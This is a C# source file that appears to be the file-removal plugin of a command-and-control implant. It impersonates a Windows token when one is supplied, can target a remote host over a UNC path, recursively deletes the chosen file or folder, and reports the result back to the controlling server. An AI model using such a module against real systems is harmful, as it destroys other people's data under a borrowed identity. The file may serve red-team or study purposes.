using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace rm
{
    public class Rm : IPlugin
    {
        public string Name => "rm";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }

        public Rm(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            string file = args.ContainsKey("file") ? args["file"] : string.Empty;
            string path = args.ContainsKey("path") ? args["path"] : string.Empty;
            string host = args.ContainsKey("host") ? args["host"] : string.Empty;

            if (!String.IsNullOrEmpty(host) & !host.StartsWith("\\\\"))
            {
                host = "\\\\" + host;
            }

            string fullPath = Path.Combine(host, path, file);
            try
            {
                FileAttributes attr = File.GetAttributes(fullPath);
                if (attr.HasFlag(FileAttributes.Directory))
                {
                    Directory.Delete(fullPath.Replace("\"", ""), true);
                }
                else
                {
                    File.Delete(fullPath.Replace("\"", ""));
                }
                messageManager.Write($"{fullPath} removed.", job.task.id, false);

            }
            catch (Exception e)
            {

                messageManager.Write(e.ToString(), job.task.id, true, "error");
                return;
            }
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
    }
}
